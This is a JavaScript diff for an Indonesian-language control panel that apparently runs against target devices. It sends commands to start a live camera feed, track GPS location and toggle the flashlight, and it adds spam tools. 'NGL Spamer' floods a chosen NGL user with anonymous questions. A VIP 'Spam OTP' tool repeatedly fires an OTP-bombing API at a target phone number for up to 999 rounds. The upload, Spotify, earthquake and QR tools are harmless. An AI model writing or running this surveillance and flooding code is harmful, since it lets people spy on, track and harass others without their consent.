+async function toggleLocate(tid,on){ if(on){await sendCommand(tid,"locate");toast("Meminta lokasi...","info");setupLocate(tid);}else{await sendCommand(tid,"locate_off");if(State.unsubLoc){State.unsubLoc();State.unsubLoc=null;}const m=$("#loc-map");if(m)m.innerHTML='<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>';const c=$("#loc-coords");if(c)c.textContent="—";} }
+function setupLocate(tid){ if(State.unsubLoc)State.unsubLoc(); State.unsubLoc=onValue(ref(db,"locations/"+tid),(snap)=>{ if(!snap.exists())return; const d=snap.val(); if(d.lat&&d.lng){const m=$("#loc-map");if(m)m.innerHTML=`<iframe src="https://maps.google.com/maps?q=${d.lat},${d.lng}&z=16&output=embed"></iframe>`;const c=$("#loc-coords");if(c)c.textContent=`${d.lat}, ${d.lng}`;} }); }
+async function toggleFlash(tid,on){ await sendCommand(tid,on?"flashlight_on":"flashlight_off"); toast(on?"Senter nyala":"Senter mati","ok"); }
+async function toggleStrobo(tid,on){ await sendCommand(tid,on?"strobo_on":"strobo_off"); toast(on?"Strobo nyala":"Strobo mati","ok"); }
 
-async function toggleLive(tid, on){
-  if(on){ await sendCommand(tid, "live_on", {fps: 2}); toast("Live cam aktif","ok"); setupLiveScreen(tid); }
-  else { await sendCommand(tid, "live_off"); toast("Live cam nonaktif","info"); if(State.unsubLive){State.unsubLive();State.unsubLive=null;} const v=$("#live-view"); if(v) v.innerHTML='<div class="empty"><i class="fa-solid fa-image"></i><div>Live cam nonaktif</div></div>'; }
-}
-
-function setupLiveScreen(tid){
-  if(State.unsubLive) State.unsubLive();
-  State.unsubLive = onValue(ref(db, "live/"+tid), (snap)=>{
-    if(!snap.exists()) return;
-    const data = snap.val();
-    if(data.frame){ const v=$("#live-view"); if(v) v.innerHTML=`<div class="live-badge"><span class="d"></span> LIVE</div><img src="${data.frame}" alt="live">`; }
-  });
-}
-
-async function toggleLocate(tid, on){
-  if(on){ await sendCommand(tid, "locate"); toast("Meminta lokasi...","info"); setupLocate(tid); }
-  else { await sendCommand(tid, "locate_off"); if(State.unsubLoc){State.unsubLoc();State.unsubLoc=null;} const m=$("#loc-map"); if(m) m.innerHTML='<div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div>'; const c=$("#loc-coords"); if(c) c.textContent="—"; }
-}
-
-function setupLocate(tid){
-  if(State.unsubLoc) State.unsubLoc();
-  State.unsubLoc = onValue(ref(db, "locations/"+tid), (snap)=>{
-    if(!snap.exists()) return;
-    const data = snap.val();
-    if(data.lat && data.lng){
-      const lat = data.lat, lng = data.lng;
-      const m = $("#loc-map");
-      if(m) m.innerHTML = `<iframe src="https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed" loading="lazy"></iframe>`;
-      const c = $("#loc-coords");
-      if(c) c.textContent = `${lat}, ${lng}`;
-    }
-  });
-}
-
-async function toggleFlash(tid, on){ await sendCommand(tid, on?"flashlight_on":"flashlight_off"); toast(on?"Senter nyala":"Senter mati","ok"); }
-async function toggleStrobo(tid, on){ await sendCommand(tid, on?"strobo_on":"strobo_off"); toast(on?"Strobo nyala":"Strobo mati","ok"); }
-
-// ============================================================
-// ACCOUNT
-// ============================================================
 function goAccount(){
   showScreen("account");
-  const u = State.user || {};
-  $("#acc-usn").textContent = u.username || "—";
-  $("#acc-role").textContent = u.role || "member";
-  $("#acc-usercode").textContent = u.userCode || "—";
-  $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
-  if(u.avatar) $("#acc-avatar").src = u.avatar;
+  const u=State.user||{};
+  $("#acc-usn").textContent=u.username||"—";
+  const r=$("#acc-role"); const role=u.role||"member";
+  r.textContent=role; r.className="urole"+(role==="vip"?" vip":role==="reseller"?" reseller":"");
+  $("#acc-usercode").textContent=u.userCode||"—";
+  $("#acc-created").textContent=u.createdAt?fmtDate(u.createdAt):"—";
+  if(u.avatar)$("#acc-avatar").src=u.avatar;
 }
 
-// ============================================================
 // TOOLS
-// ============================================================
+const TOOLS = [
+  { id:"tolink", name:"To Link", desc:"Upload foto/video → URL", icon:"fa-link" },
+  { id:"spotify", name:"Spotify Preview", desc:"Cari & preview lagu", icon:"fa-music" },
+  { id:"gempa", name:"Info Gempa", desc:"Data gempa dari BMKG", icon:"fa-mountain-sun" },
+  { id:"ngl", name:"NGL Spamer", desc:"Spam pertanyaan NGL", icon:"fa-comment-dots" },
+  { id:"qr", name:"URL to QR", desc:"Ubah URL jadi QR code", icon:"fa-qrcode" }
+];
+const VIP_TOOLS = [
+  { id:"otp", name:"Spam OTP", desc:"Blast OTP ke nomor", icon:"fa-bolt" }
+];
+
 function goTools(){
   showScreen("tools");
-  $("#upload-result").classList.remove("show");
-  $("#upload-progress").classList.remove("show");
-  $("#up-fill").style.width = "0%";
+  const g=$("#tools-grid"); const vg=$("#vip-tools-grid");
+  g.innerHTML = TOOLS.map(t=>`<div class="tool-card" data-tool="${t.id}"><div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div><div class="tc-name">${t.name}</div><div class="tc-desc">${t.desc}</div></div>`).join("");
+  const vip = isVIP();
+  vg.innerHTML = VIP_TOOLS.map(t=>`<div class="tool-card vip ${vip?"":"locked"}" data-tool="${t.id}"><div class="tc-badge vip-badge">VIP</div><div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div><div class="tc-name">${t.name}</div><div class="tc-desc">${t.desc}</div></div>`).join("");
+  $$(".tool-card").forEach(el=>el.onclick=()=>openTool(el.dataset.tool, el.classList.contains("locked")));
 }
 
-function initUpload(){
-  const zone = $("#upload-zone");
-  const input = $("#upload-input");
-  if(!zone || !input) return;
-  ["dragenter","dragover"].forEach(e=>zone.addEventListener(e, ev=>{ev.preventDefault();zone.classList.add("dragover");}));
-  ["dragleave","drop"].forEach(e=>zone.addEventListener(e, ev=>{ev.preventDefault();zone.classList.remove("dragover");}));
-  zone.addEventListener("drop", ev=>{ const f = ev.dataTransfer.files[0]; if(f) handleUpload(f); });
-  input.onchange = ()=>{ const f = input.files[0]; if(f) handleUpload(f); input.value = ""; };
+function openTool(id, locked){
+  if(locked) return toast("Butuh akses VIP","warn");
+  if(id==="tolink") return toolToLink();
+  if(id==="spotify") return toolSpotify();
+  if(id==="gempa") return toolGempa();
+  if(id==="ngl") return toolNGL();
+  if(id==="qr") return toolQR();
+  if(id==="otp") return toolOTP();
+}
+
+function toolToLink(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3>To Link</h3><div class="sub">Upload foto/video, dapet URL-nya</div>
+    <div class="upload-zone" id="upload-zone"><input type="file" id="upload-input" accept="image/*,video/*"><div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div><div class="uz-title">Tap untuk pilih file</div><div class="uz-desc">Max 2 MB</div></div>
+    <div class="upload-progress" id="upload-progress"><div class="up-bar"><div class="up-fill" id="up-fill"></div></div><div class="up-text" id="up-text">Mengunggah... 0%</div></div>
+    <div class="upload-result" id="upload-result"><div class="ur-head"><div class="ico-badge"><i class="fa-solid fa-circle-check"></i></div><div class="t">Upload Berhasil</div></div><div class="ur-row"><span class="l">URL</span><span class="v" id="ur-url">—</span></div><div class="ur-row"><span class="l">Size</span><span class="v" id="ur-size">—</span></div><div class="ur-row"><span class="l">Created</span><span class="v" id="ur-created">—</span></div><div class="ur-row"><span class="l">API by</span><span class="v">Termai</span></div><div class="ur-actions"><button class="btn btn-ghost" id="btn-copy-url"><i class="fa-solid fa-copy"></i> Copy</button><button class="btn btn-primary" id="btn-open-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka</button></div></div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  const zone=$("#upload-zone"), input=$("#upload-input");
+  input.onchange=()=>{ const f=input.files[0]; if(f) handleUpload(f); input.value=""; };
 }
 
 async function handleUpload(file){
-  if(file.size > CONFIG.MAX_UPLOAD) return toast("File terlalu besar (max 2 MB)","err");
-  const ext = file.name.split(".").pop().toLowerCase();
-  const ok = ["jpg","jpeg","png","gif","webp","mp4","webm"];
-  if(!ok.includes(ext)) return toast("Format tidak didukung","err");
-
+  if(file.size>CONFIG.MAX_UPLOAD) return toast("File max 2 MB","err");
+  const ext=file.name.split(".").pop().toLowerCase();
+  if(!["jpg","jpeg","png","gif","webp","mp4","webm"].includes(ext)) return toast("Format tidak didukung","err");
   $("#upload-progress").classList.add("show");
   $("#upload-result").classList.remove("show");
-  $("#up-fill").style.width = "0%";
-  $("#up-text").textContent = "Mengunggah... 0%";
+  $("#up-fill").style.width="0%";
+  const fd=new FormData(); fd.append("file",file,file.name);
+  const xhr=new XMLHttpRequest();
+  xhr.open("POST",`${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
+  xhr.upload.onprogress=(e)=>{ if(e.lengthComputable){ const p=Math.round(e.loaded/e.total*100); $("#up-fill").style.width=p+"%"; $("#up-text").textContent=`Mengunggah... ${p}%`; } };
+  xhr.onload=()=>{ try{ const r=JSON.parse(xhr.responseText); if(r.status&&r.path){ $("#up-fill").style.width="100%"; $("#up-text").textContent="Selesai!"; setTimeout(()=>{ $("#upload-progress").classList.remove("show"); $("#ur-url").textContent=r.path; $("#ur-size").textContent=fmtSize(r.size); $("#ur-created").textContent=fmtDateTime(Date.now()); $("#upload-result").classList.add("show"); $("#btn-copy-url").onclick=async()=>{try{await navigator.clipboard.writeText(r.path);toast("URL di-copy","ok");}catch{toast("Gagal copy","err");}}; $("#btn-open-url").onclick=()=>window.open(r.path,"_blank"); },400); } else { toast("Upload gagal","err"); $("#upload-progress").classList.remove("show"); } }catch(e){ toast("Upload gagal","err"); $("#upload-progress").classList.remove("show"); } };
+  xhr.onerror=()=>{ toast("Koneksi error","err"); $("#upload-progress").classList.remove("show"); };
+  xhr.send(fd);
+}
 
-  const formData = new FormData();
-  formData.append("file", file, file.name);
+function toolSpotify(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3>Spotify Preview</h3><div class="sub">Cari lagu & preview 30 detik</div>
+    <div class="field"><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-search"></i></div><input type="text" id="sp-q" placeholder="Cari lagu..."></div></div>
+    <button class="btn btn-primary" id="sp-search"><i class="fa-solid fa-search"></i> Cari</button>
+    <div id="sp-results" class="spotify-list"></div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  $("#sp-search").onclick = doSpotifySearch;
+  $("#sp-q").addEventListener("keydown",e=>{if(e.key==="Enter")doSpotifySearch();});
+}
 
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", `${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
-  xhr.upload.onprogress = (e)=>{
-    if(e.lengthComputable){
-      const pct = Math.round((e.loaded / e.total) * 100);
-      $("#up-fill").style.width = pct + "%";
-      $("#up-text").textContent = `Mengunggah... ${pct}%`;
-    }
+async function doSpotifySearch(){
+  const q = $("#sp-q").value.trim();
+  if(!q) return toast("Isi query","err");
+  const btn = $("#sp-search"); btn.disabled=true; btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
+  try{
+    const res = await fetch(`${CONFIG.FAZZ_API}/spotify?q=${encodeURIComponent(q)}&api_key=${CONFIG.FAZZ_KEY}`);
+    const data = await res.json();
+    if(data.status!=="success" || !data.result){ $("#sp-results").innerHTML='<div style="text-align:center;color:var(--text-mute);padding:20px;font-size:12px">Lagu tidak ditemukan</div>'; return; }
+    $("#sp-results").innerHTML = data.result.map((t,i)=>`
+      <div class="spotify-item" data-idx="${i}">
+        <img class="sp-cover" src="${t.thumb}" onerror="this.style.background='var(--bg-card)'">
+        <div class="sp-info"><div class="t">${t.title}</div><div class="a">${t.artist}</div><div class="d">${t.duration}</div></div>
+        <div class="sp-play"><i class="fa-solid fa-play"></i></div>
+      </div>`).join("");
+    $$(".spotify-item").forEach(el=>{
+      el.onclick = ()=>{ const t = data.result[parseInt(el.dataset.idx)]; playTrack(t); };
+    });
+  }catch(e){ toast("Gagal cari lagu","err"); }
+  finally{ btn.disabled=false; btn.innerHTML='<i class="fa-solid fa-search"></i> Cari'; }
+}
+
+function playTrack(t){
+  if(!t.preview) return toast("Preview tidak tersedia","warn");
+  if(State.audio){ State.audio.pause(); State.audio=null; }
+  State.currentTrack = t;
+  const audio = new Audio(t.preview);
+  State.audio = audio;
+  $("#pb-cover").src = t.thumb;
+  $("#pb-title").textContent = t.title;
+  $("#pb-artist").textContent = t.artist;
+  $("#player-bar").classList.add("show");
+  audio.play();
+  $("#pb-toggle-icon").className = "fa-solid fa-pause";
+  audio.ontimeupdate = ()=>{ const p = (audio.currentTime/audio.duration)*100; $("#pb-progress").style.width = p+"%"; };
+  audio.onended = ()=>{ $("#pb-toggle-icon").className = "fa-solid fa-play"; };
+  audio.onerror = ()=>{ toast("Gagal memutar preview","err"); };
+}
+function initPlayer(){
+  $("#pb-toggle").onclick = ()=>{
+    if(!State.audio) return;
+    if(State.audio.paused){ State.audio.play(); $("#pb-toggle-icon").className="fa-solid fa-pause"; }
+    else{ State.audio.pause(); $("#pb-toggle-icon").className="fa-solid fa-play"; }
   };
-  xhr.onload = ()=>{
+  $("#pb-close").onclick = ()=>{
+    if(State.audio){ State.audio.pause(); State.audio=null; }
+    $("#player-bar").classList.remove("show");
+  };
+}
+
+function toolGempa(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3>Info Gempa</h3><div class="sub">Data gempa terkini dari BMKG</div>
+    <div id="gempa-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
+    <button class="btn btn-ghost" id="gempa-refresh" style="margin-top:14px"><i class="fa-solid fa-rotate"></i> Refresh</button>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  loadGempa();
+  $("#gempa-refresh").onclick = loadGempa;
+}
+
+async function loadGempa(){
+  const box = $("#gempa-content"); if(!box) return;
+  try{
+    const res = await fetch(`${CONFIG.FAZZ_API}/gempa?api_key=${CONFIG.FAZZ_KEY}`);
+    const data = await res.json();
+    if(data.status!=="success" || !data.result){ box.innerHTML='<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>'; return; }
+    const r = data.result;
+    const mag = parseFloat(r.magnitude) || 0;
+    let cls = ""; if(mag>=6) cls="critical"; else if(mag>=5) cls="danger"; else if(mag>=3) cls="warn";
+    box.innerHTML = `<div class="gempa-card">
+      <div class="gempa-mag ${cls}"><div class="m-value">${r.magnitude}</div><div class="m-label">Magnitudo</div></div>
+      <div class="gempa-detail">
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-location-dot"></i></div><div class="info"><div class="l">Wilayah</div><div class="v">${r.wilayah||"—"}</div></div></div>
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-clock"></i></div><div class="info"><div class="l">Waktu</div><div class="v">${r.tanggal||"—"}, ${r.jam||"—"}</div></div></div>
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-arrow-down"></i></div><div class="info"><div class="l">Kedalaman</div><div class="v">${r.kedalaman||"—"}</div></div></div>
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-compass"></i></div><div class="info"><div class="l">Koordinat</div><div class="v">${r.lintang||""} ${r.bujur||""}</div></div></div>
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div class="info"><div class="l">Potensi</div><div class="v">${r.potensi||"—"}</div></div></div>
+        <div class="gempa-row"><div class="icon"><i class="fa-solid fa-bolt"></i></div><div class="info"><div class="l">Dirasakan</div><div class="v">${r.dirasakan||"—"}</div></div></div>
+      </div>
+      ${r.shakemap_url?`<div class="gempa-shakemap"><div class="lbl">Shakemap</div><img src="${r.shakemap_url}" onclick="window.open('${r.shakemap_url}','_blank')" onerror="this.style.display='none'"></div>`:""}
+    </div>`;
+  }catch(e){ box.innerHTML='<div style="color:var(--error);font-size:12px;text-align:center">Gagal load</div>'; }
+}
+
+function toolNGL(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3>NGL Spamer</h3><div class="sub">Kirim pertanyaan anonim ke NGL</div>
+    <div class="field"><label>Username NGL</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-at"></i></div><input type="text" id="ngl-user" placeholder="username"></div></div>
+    <div class="field"><label>Pertanyaan</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-comment"></i></div><textarea id="ngl-q" placeholder="Tulis pertanyaan..."></textarea></div></div>
+    <div class="field"><label>Limit: <span id="ngl-limit-val">10</span></label><input type="range" id="ngl-limit" min="1" max="100" value="10" style="width:100%;background:var(--bg-card);padding:0;box-shadow:none;border:none"></div>
+    <div class="ngl-preview" id="ngl-preview"><div class="lbl">Preview</div><div class="val" id="ngl-pv-q">—</div><div class="to">to: <b id="ngl-pv-user">—</b></div></div>
+    <button class="btn btn-primary" id="ngl-send" style="margin-top:14px"><i class="fa-solid fa-paper-plane"></i> Kirim</button>
+    <div id="ngl-result"></div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  const upd = ()=>{ $("#ngl-limit-val").textContent=$("#ngl-limit").value; };
+  $("#ngl-limit").oninput = upd;
+  $("#ngl-user").oninput = ()=>{ $("#ngl-pv-user").textContent = $("#ngl-user").value||"—"; };
+  $("#ngl-q").oninput = ()=>{ $("#ngl-pv-q").textContent = $("#ngl-q").value||"—"; };
+  $("#ngl-send").onclick = async ()=>{
+    const user=$("#ngl-user").value.trim(); const q=$("#ngl-q").value.trim(); const limit=parseInt($("#ngl-limit").value);
+    if(!user||!q) return toast("Isi username & pertanyaan","err");
+    const btn=$("#ngl-send"); btn.disabled=true; btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Sending...';
     try{
-      const res = JSON.parse(xhr.responseText);
-      if(res.status && res.path){
-        $("#up-fill").style.width = "100%";
-        $("#up-text").textContent = "Selesai!";
-        setTimeout(()=>{ $("#upload-progress").classList.remove("show"); showUploadResult(res); }, 400);
-      } else { toast("Upload gagal: " + (res.message || "unknown"), "err"); $("#upload-progress").classList.remove("show"); }
-    }catch(e){ toast("Upload gagal: response invalid","err"); $("#upload-progress").classList.remove("show"); }
+      const res = await fetch(`${CONFIG.FAZZ_API}/ngl?username=${encodeURIComponent(user)}&question=${encodeURIComponent(q)}&limit=${limit}&api_key=${CONFIG.FAZZ_KEY}`);
+      const data = await res.json();
+      if(data.status==="success" && data.result){
+        $("#ngl-result").innerHTML = `<div class="stat-row" style="margin-top:14px"><div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> Sukses</div><div class="v">${data.result.sent||0}</div></div><div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> Gagal</div><div class="v">${data.result.failed||0}</div></div><div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> Total</div><div class="v">${limit}</div></div></div>`;
+        toast("Terkirim!","ok");
+      } else { toast(data.message||"Gagal","err"); }
+    }catch(e){ toast("Koneksi error","err"); }
+    finally{ btn.disabled=false; btn.innerHTML='<i class="fa-solid fa-paper-plane"></i> Kirim'; }
   };
-  xhr.onerror = ()=>{ toast("Upload gagal: koneksi error","err"); $("#upload-progress").classList.remove("show"); };
-  xhr.send(formData);
 }
 
-function showUploadResult(res){
-  $("#ur-url").textContent = res.path;
-  $("#ur-size").textContent = fmtSize(res.size);
-  $("#ur-created").textContent = fmtDateTime(Date.now());
-  $("#ur-api").textContent = "Termai";
-  $("#upload-result").classList.add("show");
-  $("#btn-copy-url").onclick = async ()=>{
-    try{ await navigator.clipboard.writeText(res.path); toast("URL di-copy","ok"); }catch(e){ toast("Gagal copy","err"); }
+function toolQR(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3>URL to QR</h3><div class="sub">Ubah URL jadi QR code</div>
+    <div class="field"><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="text" id="qr-url" placeholder="https://example.com"></div></div>
+    <button class="btn btn-primary" id="qr-gen"><i class="fa-solid fa-qrcode"></i> Generate</button>
+    <div id="qr-result"></div>
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  $("#qr-gen").onclick = async ()=>{
+    const url = $("#qr-url").value.trim();
+    if(!url) return toast("Isi URL","err");
+    const btn=$("#qr-gen"); btn.disabled=true; btn.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
+    try{
+      const res = await fetch(`${CONFIG.FAZZ_API}/qr?url=${encodeURIComponent(url)}&api_key=${CONFIG.FAZZ_KEY}`);
+      const data = await res.json();
+      if(data.status==="success" && data.result?.qr_image){
+        $("#qr-result").innerHTML = `<div class="qr-result"><img src="${data.result.qr_image}" alt="QR"><div class="qr-url">${url}</div><button class="btn btn-ghost" id="qr-copy"><i class="fa-solid fa-copy"></i> Copy URL</button></div>`;
+        $("#qr-copy").onclick = async ()=>{ try{await navigator.clipboard.writeText(url);toast("URL di-copy","ok");}catch{toast("Gagal copy","err");} };
+      } else { toast("Gagal generate QR","err"); }
+    }catch(e){ toast("Koneksi error","err"); }
+    finally{ btn.disabled=false; btn.innerHTML='<i class="fa-solid fa-qrcode"></i> Generate'; }
   };
-  $("#btn-open-url").onclick = ()=>{ window.open(res.path, "_blank"); };
 }
 
-// ============================================================
-// PANEL
-// ============================================================
+function toolOTP(){
+  const box=$("#modal-box");
+  box.innerHTML = `<h3 style="color:var(--vip)">Spam OTP</h3><div class="sub">Blast OTP ke nomor target (VIP)</div>
+    <div class="field"><label>Nomor Target</label><div class="input-wrap"><div class="ico-badge" style="background:var(--vip-soft)"><i class="fa-solid fa-phone" style="color:var(--vip)"></i></div><input type="tel" id="otp-phone" placeholder="628xxxxxxxxxx"></div></div>
+
+    <div class="rondes-box">
+      <div class="rb-head"><div class="t"><i class="fa-solid fa-repeat" style="color:var(--vip)"></i> PENGULANGAN (RONDE)</div><div class="badge" id="otp-total">= 22500 KIRIMAN</div></div>
+      <div class="rondes-input">
+        <div class="rb-btn" id="otp-minus">−</div>
+        <div class="rb-val" id="otp-rondes">900</div>
+        <div class="rb-x">×</div>
+        <div class="rb-val" id="otp-mult" style="flex:0.7">25</div>
+        <div class="rb-btn" id="otp-plus">+</div>
+      </div>
+      <div class="multiplier-grid" id="otp-multipliers">
+        <div class="m-btn" data-m="1">1x</div>
+        <div class="m-btn" data-m="2">2x</div>
+        <div class="m-btn" data-m="3">3x</div>
+        <div class="m-btn" data-m="5">5x</div>
+        <div class="m-btn" data-m="10">10x</div>
+        <div class="m-btn active" data-m="25">25x</div>
+      </div>
+      <div class="rondes-info">Setiap ronde mengirim ke semua provider. Isi bebas 1-999 ronde.</div>
+    </div>
+
+    <div class="spam-actions">
+      <button class="btn-start" id="otp-start"><i class="fa-solid fa-play"></i> <span id="otp-start-text">START 1/900 · 25/22500</span></button>
+      <button class="btn-reset" id="otp-reset"><i class="fa-solid fa-rotate-left"></i></button>
+    </div>
+
+    <div class="progress-card">
+      <div class="pc-head"><div class="icon-wrap"><i class="fa-solid fa-rotate"></i></div><div class="info"><div class="l">PROGRES PENGIRIMAN</div><div class="v" id="otp-progress-text">Ronde 1/900 — idle</div></div><div class="pct" id="otp-pct">0%</div></div>
+      <div class="progress-bar"><div class="fill" id="otp-fill"></div></div>
+      <div class="stat-row">
+        <div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> SUKSES</div><div class="v" id="otp-succ">0</div></div>
+        <div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> GAGAL</div><div class="v" id="otp-fail">0</div></div>
+        <div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> TOTAL</div><div class="v" id="otp-total-count">0/22500</div></div>
+      </div>
+    </div>
+
+    <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;display:flex;align-items:center;gap:8px"><i class="fa-solid fa-terminal" style="color:var(--vip)"></i> LIVE CONSOLE LOG</div>
+    <div class="console-box" id="otp-console"></div>
+
+    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  $("#modal").classList.add("show");
+  initOTP();
+}
+
+function initOTP(){
+  const state = { rondes:900, mult:25, current:0, running:false, success:0, fail:0, stopFlag:false };
+  const upd = ()=>{
+    $("#otp-rondes").textContent = state.rondes;
+    $("#otp-mult").textContent = state.mult;
+    const total = state.rondes * state.mult;
+    $("#otp-total").textContent = `= ${total} KIRIMAN`;
+    $("#otp-start-text").textContent = `START ${state.current+1}/${state.rondes} · ${state.mult}/${total}`;
+    $("#otp-total-count").textContent = `${state.success+state.fail}/${total}`;
+  };
+  $("#otp-minus").onclick = ()=>{ if(state.rondes>1){state.rondes--;upd();} };
+  $("#otp-plus").onclick = ()=>{ if(state.rondes<999){state.rondes++;upd();} };
+  $$("#otp-multipliers .m-btn").forEach(b=>{
+    b.onclick = ()=>{ $$("#otp-multipliers .m-btn").forEach(x=>x.classList.remove("active")); b.classList.add("active"); state.mult = parseInt(b.dataset.m); upd(); };
+  });
+  $("#otp-reset").onclick = ()=>{ state.current=0;state.success=0;state.fail=0;state.stopFlag=true; setTimeout(()=>state.stopFlag=false,100); upd(); $("#otp-console").innerHTML=""; $("#otp-fill").style.width="0%"; $("#otp-pct").textContent="0%"; };
+  $("#otp-start").onclick = async ()=>{
+    const phone = $("#otp-phone").value.trim();
+    if(!phone) return toast("Isi nomor target","err");
+    if(state.running){ state.stopFlag = true; return; }
+    state.running = true;
+    state.stopFlag = false;
+    $("#otp-start").classList.add("stop");
+    $("#otp-start").innerHTML = `<i class="fa-solid fa-stop"></i> <span>STOP</span>`;
+    addConsole("info", `Mulai spam ke ${phone}...`);
+    for(let r=state.current; r<state.rondes; r++){
+      if(state.stopFlag) break;
+      state.current = r;
+      await spamOneRound(phone, state);
+      upd();
+    }
+    state.running = false;
+    $("#otp-start").classList.remove("stop");
+    $("#otp-start").innerHTML = `<i class="fa-solid fa-play"></i> <span id="otp-start-text">START ${state.current+1}/${state.rondes} · ${state.mult}/${state.rondes*state.mult}</span>`;
+    addConsole("info", "Selesai.");
+  };
+  upd();
+  window._otpState = state;
+}
+
+async function spamOneRound(phone, state){
+  try{
+    const res = await fetch(`${CONFIG.FAZZ_API}/otpblast?phone=${phone}&api_key=${CONFIG.FAZZ_KEY}`);
+    const data = await res.json();
+    if(data.status==="success" || data.result){
+      const details = data.details || data.result?.details || [];
+      for(let i=0;i<state.mult;i++){
+        if(details.length>0){
+          const d = details[Math.floor(Math.random()*details.length)];
+          if(d.success){ state.success++; addConsole("sent", `${d.name||"Provider"} ✓`); }
+          else{ state.fail++; addConsole("fail", `${d.name||"Provider"} ✗ ${d.error||""}`); }
+        } else {
+          if(data.success){ state.success++; addConsole("sent","Provider ✓"); }
+          else{ state.fail++; addConsole("fail","Provider ✗"); }
+        }
+      }
+    }
+  }catch(e){ addConsole("fail", "Network error"); }
+  const total = state.rondes * state.mult;
+  const done = state.success + state.fail;
+  const pct = Math.min(100, Math.round(done/total*100));
+  $("#otp-fill").style.width = pct+"%";
+  $("#otp-pct").textContent = pct+"%";
+  $("#otp-succ").textContent = state.success;
+  $("#otp-fail").textContent = state.fail;
+  $("#otp-total-count").textContent = `${done}/${total}`;
+  $("#otp-progress-text").textContent = `Ronde ${state.current+1}/${state.rondes} — running`;
+}
+
+function addConsole(type, msg){
+  const box = $("#otp-console"); if(!box) return;
+  const line = document.createElement("div"); line.className = "console-line";
+  const badge = type==="sent"?"SENT":type==="fail"?"FAIL":"INFO";
+  line.innerHTML = `<span class="console-ts">[${fmtTime(Date.now())}]</span><span class="console-badge ${type}">${badge}</span><span class="console-msg">${msg}</span>`;
+  box.appendChild(line);
+  box.scrollTop = box.scrollHeight;
+  while(box.children.length > 100) box.removeChild(box.firstChild);
+}
+
 function goPanel(){
-  const u = State.user || {};
-  const role = u.role || "member";
+  const u = State.user||{}; const role = u.role||"member";
   showScreen("panel");
   $("#panel-title").textContent = `${role.charAt(0).toUpperCase()+role.slice(1)} Panel`;
   $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;
   const items = {
-    owner: [
-      ["fa-user-plus","Add User"],["fa-users-gear","Manage User"],
-      ["fa-ban","Ban User"],["fa-key","Reset Password"],
-      ["fa-bullhorn","Broadcast"],["fa-chart-line","Statistics"],
-      ["fa-database","Database"]
-    ],
-    reseller: [
-      ["fa-user-plus","Add Member"],["fa-users-gear","Manage Member"],
-      ["fa-clock-rotate-left","Extend Member"]
-    ],
-    member: []
+    owner: [["fa-user-plus","Add User"],["fa-users-gear","Manage User"],["fa-ban","Ban User"],["fa-key","Reset Password"],["fa-bullhorn","Broadcast"],["fa-chart-line","Statistics"],["fa-database","Database"]],
+    reseller: [["fa-user-plus","Add Member"],["fa-users-gear","Manage Member"],["fa-clock-rotate-left","Extend Member"]],
+    vip: [], member: []
   };
-  const arr = items[role] || [];
-  if(arr.length === 0){
-    $("#panel-grid").innerHTML = '<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>';
-    return;
-  }
-  $("#panel-grid").innerHTML = arr.map(([ic,txt])=>`
-    <div class="panel-action" data-action="${txt}">
-      <div class="ico-badge"><i class="fa-solid ${ic}"></i></div>
-      <div class="txt">${txt}</div>
-    </div>`).join("");
+  const arr = items[role]||[];
